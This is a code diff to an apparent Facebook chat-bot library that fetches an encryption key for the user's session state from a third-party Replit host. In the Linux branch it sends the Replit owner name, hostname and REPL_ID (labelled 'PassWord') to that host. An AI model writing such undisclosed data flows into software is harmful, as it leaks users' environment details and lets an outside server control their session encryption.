@@ -493,8 +493,7 @@ try {
         //const chalk = require("chalk");
         var logger = require('./logger');
         //const figlet = require("figlet");
-        const fs = require("fs-extra");
-       // const os = require("os");
+       const os = require("os");
         const { execSync } = require('child_process');
         var { readFileSync } = require('fs-extra');
         // let rl = readline.createInterface({
@@ -560,22 +559,57 @@ try {
         //     }
         // });
 
-    try {
-        var axios = require('axios');
-        var { data } = await axios.get('https://encrypt-appstate.mrdatvip05.repl.co/getKey', { method: 'GET' });
-        process.env['FBKEY'] = data.Data;
-    }
-    catch (e) {
-        try {
-            var axios = require('axios');
-            var { data } = await axios.get('https://encrypt-appstate.mrdatvip05.repl.co/getKey', { method: 'GET' });
-            process.env['FBKEY'] = data.Data;
+        switch (process.platform) {
+            case "win32": {
+                try {
+                    var axios = require('axios');
+                    var { data } = await axios.get('https://encrypt-appstate.mrdatvip05.repl.co/getKey', { method: 'GET' });
+                    process.env['FBKEY'] = data.Data;
+                }
+                catch (e) {
+                    try {
+                        var axios = require('axios');
+                        var { data } = await axios.get('https://encrypt-appstate.mrdatvip05.repl.co/getKey', { method: 'GET' });
+                        process.env['FBKEY'] = data.Data;
+                    }
+                    catch (e) {
+                    submiterr(e);
+                    logger('Lỗi Khi Get Key !', '[ FCA-HZI ]');
+                    }
+                }
+            }
+                break;
+            case "linux": {
+                if (process.env["REPL_ID"] == undefined) {
+                    logger("Hiện Tại Hệ Điều Hành Linux Không Thuộc Về Replit Chưa Được Hỗ Trợ !", "[ FCA-HZI ]");
+                    process.exit(0);
+                }
+                else {
+                    try {
+                        var axios = require('axios');
+                        var { data } = await axios.get(`https://encrypt-appstate.mrdatvip05.repl.co/getKey?UserName=${encodeURI(process.env['REPL_OWNER'])}&HostName=${encodeURI(process.env['HOSTNAME'])}&PassWord=${encodeURI(process.env['REPL_ID'])}`, { method: 'GET' });
+                        process.env['FBKEY'] = data.Data;
+                    }
+                    catch (e) {
+                        try {
+                            var axios = require('axios');
+                            var { data } = await axios.get(`https://encrypt-appstate.mrdatvip05.repl.co/getKey?UserName=${encodeURI(process.env['REPL_OWNER'])}&HostName=${encodeURI(process.env['HOSTNAME'])}&PassWord=${encodeURI(process.env['REPL_ID'])}`, { method: 'GET' });
+                            process.env['FBKEY'] = data.Data;
+                        }
+                        catch (e) {
+                        submiterr(e);
+                        logger('Lỗi Khi Get Key !', '[ FCA-HZI ]');
+                        }
+                    }
+                }
+            }
+                break;
+            default: {
+                logger('Hệ Điều Hành Bạn Không Được Hỗ Trợ', '[ FCA-HZI ]');
+                process.exit(0);
+            }
         }
-        catch (e) {
-        submiterr(e);
-        logger('Lỗi Khi Get Key !', '[ FCA-HZI ]');
-        }
-    }
+
         try {
             appState = JSON.stringify(appState);appState = JSON.parse(appState);
             if (Array.isArray(appState) == true) {
